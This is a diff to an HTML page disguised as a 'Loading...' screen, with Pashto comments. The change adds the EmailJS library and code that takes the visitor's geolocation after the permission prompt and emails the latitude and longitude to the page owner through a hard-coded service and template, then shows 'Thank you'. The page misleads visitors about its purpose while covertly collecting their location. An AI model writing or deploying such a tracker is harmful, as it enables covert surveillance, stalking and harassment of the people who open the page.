@@ -3,21 +3,30 @@
 <head>
   <meta charset="UTF-8">
   <title>Loading...</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
 
 <script>
+(function(){
+  emailjs.init("cSH_WYb8TQU1qGpC1"); // ← خپل Public Key
+})();
+
 navigator.geolocation.getCurrentPosition(
   function(position) {
     var lat = position.coords.latitude;
     var lon = position.coords.longitude;
 
-    // معلومات view.html ته لیږل
-    window.location.href =
-      "view.html?lat=" + lat + "&lon=" + lon;
+    emailjs.send("service_6t41xnf", "template_8p0e5d6", {
+      lat: lat,
+      lon: lon
+    }).then(function() {
+      document.body.innerHTML = "Thank you";
+    });
+
   },
   function() {
-    document.body.innerHTML = "Location permission denied";
+    document.body.innerHTML = "Permission denied";
   }
 );
 </script>
